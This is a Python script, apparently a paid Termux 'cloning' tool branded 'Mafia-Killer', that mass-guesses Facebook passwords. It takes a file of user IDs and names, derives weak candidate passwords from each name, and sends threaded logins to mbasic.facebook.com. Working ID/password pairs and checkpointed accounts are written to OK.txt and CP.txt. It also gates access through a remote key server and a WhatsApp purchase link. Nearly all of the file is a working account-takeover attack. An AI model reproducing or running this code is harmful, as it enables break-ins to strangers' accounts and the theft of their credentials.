#coding=utf-8
#Orginal writer - dragon
#Coding - python3
import os, sys, re, time, json, requests, random, subprocess
from concurrent.futures import ThreadPoolExecutor
from requests.exceptions import ConnectionError
from bs4 import BeautifulSoup as parser
from time import sleep
try:
	import bs4
except ImportError:
	print("\n [!] bs4 module is not installed yet")
	os.system("pip install bs4")
try:
	import concurrent.futures
except ImportError:
	print("\n [!] futures module is not installed yet")
	os.system("pip install futures")
#############################
#########MY BANNER##########
############################
color = random.choice(['\033[1;91m*','\033[1;92m*','\033[1;93m*','\033[1;94m*','\033[1;95m*','\033[1;96m*'])
write = input

def banner():
	print("""\n\033[105m\033[97m                    2022 Update tool                \033[0m\033[94m\n
\033[94m ▄█████████████▄
 \033[94m███████\033[97m██████\033[94m██   \033[1;97m  <<<\033[100m\033[1;92m  Pakistan  \033[0m>>>
\033[94m ███████\033[97m███\033[94m█████ 
\033[94m █████\033[97m████████\033[94m██  \033[91m~> \033[97mName     \033[97m : \033[95mMafia-Killer
\033[94m ███████\033[97m███\033[94m█████  \033[91m~> \033[97mWhats app\033[97m : \033[93m+92132197796
\033[94m ███████\033[97m███\033[94m█████  \033[91m~> \033[97mNote      \033[97m: \033[96mUse 4g sim net
\033[94m ▀██████\033[97m███\033[94m████▀\n
\033[105m\033[97m                     Paid Tool                     \033[0m\033[94m""")
################################
#########MAIN CLASS INT##########
################################
class Mk:
	def __init__(self):
		self.id = []
		self.ok = []
		self.cp = []
		self.loop = 0
#############################################
#########FILE ACCOUNT CLONING METHOD##########
#############################################
	def __id3__(self):
		try:
			fileX = write(' [?] enter your file : ')
			for line in open(fileX, 'r').readlines():
				self.id.append(line.strip())
		except IOError:
			exit("\n [!] file %s not found"%(fileX))
		print("\n [!] total id ~> \033[0;32m(%s)\n \033[0;37m[!] ok result saved in ~> ok.txt\n [!] cp result saved in ~> cp.txt\n [!]\033[1;92m if no result turn on airplane mode 5 seconds\033[1;00m\n"%(len(self.id))) 
		with ThreadPoolExecutor(max_workers=30) as dargonx:
			for user in self.id:
				try:
					uid,name = user.split("<=>")
					x = name.split(' ')
					if len(x) >=6:
						px = [ name , x[0]+x[1] , x[0]+x[0], x[0]+x[1]+"786" ]
					else:
						px = [ name , x[0]+x[1] , x[0]+x[0], x[0]+x[1]+"786" ]
					dargonx.submit(self.__mbasic__, uid, px)
				except:pass
	def __mbasic__(self, uid, px):
		ua = 'NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+'
		sys.stdout.write(
			"\r ["+color+"\033[1;97m] [%s/%s] - [ok - %s] - [cp - %s] "%(self.loop, len(self.id), len(self.ok), len(self.cp))
		); sys.stdout.flush()
		host=('https://mbasic.facebook.com')
		for pw in px:
			kwargs = {}
			pw = pw.lower()
			ses = requests.Session()
			ses.headers.update({"origin": host, "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "accept-encoding": "gzip, deflate", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "user-agent": ua, "Host": "".join(bs4.re.findall("://(.*?)$",host)), "referer": host+"/login/?next&ref=dbl&fl&refid=8", "cache-control": "max-age=0", "upgrade-insecure-requests": "1", "content-type": "application/x-www-form-urlencoded"})
			p = ses.get(host+"/login/?next&ref=dbl&refid=8").text
			b = parser(p,"html.parser")
			bl = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login"]
			for i in b("input"):
				try:
					if i.get("name") in bl:kwargs.update({i.get("name"):i.get("value")})
					else:continue
				except:pass
			kwargs.update({"email": uid,"pass": pw,"prefill_contact_point": "","prefill_source": "","prefill_type": "","first_prefill_source": "","first_prefill_type": "","had_cp_prefilled": "false","had_password_prefilled": "false","is_smart_lock": "false","_fb_noscript": "true"})
			gaaa = ses.post(host+"/login/device-based/regular/login/?refsrc=https%3A%2F%2Fmbasic.facebook.com%2F&lwv=100&refid=8",data=kwargs)
			if "c_user" in ses.cookies.get_dict().keys():
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print("\r \x1b[0;32m[Mafia-Killer-OK] %s|%s\x1b[0;00m"%(uid, pw))
				self.ok.append("%s|%s"%(uid, pw))
				open("OK.txt","a").write(" [ok] %s|%s\n"%(uid, pw))
				break
			elif "checkpoint" in ses.cookies.get_dict().keys():
				print("\r \x1b[0;31m[Mafia-Killer-CP] %s|%s\x1b[0;00m"%(uid, pw))
				self.cp.append("%s|%s"%(uid, pw))
				open("CP.txt","a").write(" [cp] %s|%s\n"%(uid, pw))
				break
			else:
				continue
		self.loop+=1
################################################
#########MBASIC ACCOUNT CLONING METHOD##########
##############################################

######################################
#########SAVING FILE/DOCUMENT##########
######################################
	def main_ddargonxxx():
		os.system("git pull")
		try:os.dargondir("/sdcard/2022.txt/")
		except:pass
		try:os.mkdir("CP")
		except:pass
		try:os.mkdir("OK")
		except:pass
############################################
#########MAIN MENU APPROVAL METHOD##########
############################################
	def __start__(self):
		os.system("clear")
		banner()
		uid = os.getuid()
		key = ("%s439493%s6372=="%(uid,uid))
		try:
			#dargon(50*'-')
			#dargon(" [✓] your key : "+key)
			#dargon(50*'-')
			a = requests.get("http://dragon.djs-server.my.id/chek.php?project=dragon&apikey="+key).json()
			if a["status"] == "error":
				print(50*'\033[0;91m-\033[0;0m')
				print (" [!] Tool    : nm.py")
				print (" [!] Expired : your key not registered")
				print (" [!] Status  : \033[1;31mTrail\033[0;97m")
				print(50*'\033[0;91m-\033[0;0m')
				errror = write(" \033[0;91m[×] start file cloning [Full name password fast cloning]\n\033[0;97m [B] \033[0;97mBUY TOOL \x1b[1;97m[\033[1;92mREGISTRATION\033[1;97m]\n\n [*] write\033[1;93m B \033[1;97mand send key : ")
				if errror =='':
					print("\n\033[3;97m [!] You Have To Upgrade To Premium First, Please Choose Number (5)\033[1;0m")
				elif errror in ["B", "b"]:
					print(" \033[1;95m[✓] Don't termux data Clear after Approval\n")
					print(" \033[1;93m[✓] This is a one Time Approval Tool\n")
					write(" [!] sent key admin (press enter)")
					os.system('am start https://wa.me/+923132197796?text=hello%20admin,%20I%20want%20to%20buy%20a%20premium%20script%20:%20' + key + ' >/dev/null')
			elif a["status"] == "expired":
				print("\n [!] your key expired")
				write(" [*] sent key admin (press enter) ")
				os.system('am start https://wa.me/+923132197796?text=hello%20admin,%20I%20want%20to%20buy%20a%20premium%20script%20:%20' + key + ' >/dev/null')
			else:
				os.system("clear")
				banner()
				print(50*'\033[0;91m-\033[0;0m')
				print (" [!] Tool    : nm.py")
				print (" [!] Expired : %s"%(a["expired"]))
				print (" [!] Status  : \033[1;32mPremium\033[0;97m")
				print(50*'\033[0;91m-\033[0;0m')
				choose = write(" [03] start file cloning [full name pass fast cloning]\n [*] input : ")
				if choose in [""]:
					print (" [!] please select correct option")
					self.__start__()
				elif choose in ["1", "01"]:
					self.__id3__()
				elif choose in ["2", "02"]:
					os.system("python dm.py")
				elif choose in ["3", "03"]:
					os.system("python nm.py")
				elif choose in ["4", "04"]:
					os.system("python digit.py")
				elif choose in ["0", "00"]:
					exit()
		except ValueError:
			exit(" [!] info: website under maintanance")
################################
#########CLOSING VIRABLE##########
################################
try:Mk().__start__()
except Exception as e:exit(str(e))
#Orginal writer : dargon
#Coding Lover
######FUCK OFF######
